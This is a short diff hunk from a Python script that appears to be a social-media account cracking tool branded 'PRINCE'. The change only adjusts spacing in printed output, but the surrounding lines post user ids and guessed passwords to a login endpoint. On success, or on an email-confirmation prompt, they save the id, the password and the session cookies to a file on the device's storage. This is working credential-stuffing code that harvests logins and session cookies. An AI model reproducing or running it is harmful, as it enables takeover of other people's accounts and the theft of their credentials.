@@ -482,13 +482,13 @@ def file_sub(uid, pwx, name, meth, fl):
             rq = requests.post(url, data=data, headers=head, allow_redirects=False, verify=certifi.where()).json()
             if "session_key" in rq:
                 coki = ";".join(i["name"] + "=" + i["value"] for i in rq["session_cookies"])
-                print(f"\r\r[b r green_yellow][PRINCE-OK]     [/b r green_yellow][b chartreuse1]{uid}|{ps}")
+                print(f"\r\r[b r green_yellow][PRINCE-OK]     [/b r green_yellow][b chartreuse1]    {uid}|{ps}")
                 open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
                 oks.append(uid)
 
                 break
             elif "Please Confirm Email" in str(rq):
-                print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]{uid}|{ps}")
+                print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]    {uid}|{ps}")
                 open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + "\n")
                 oks.append(uid)
                 
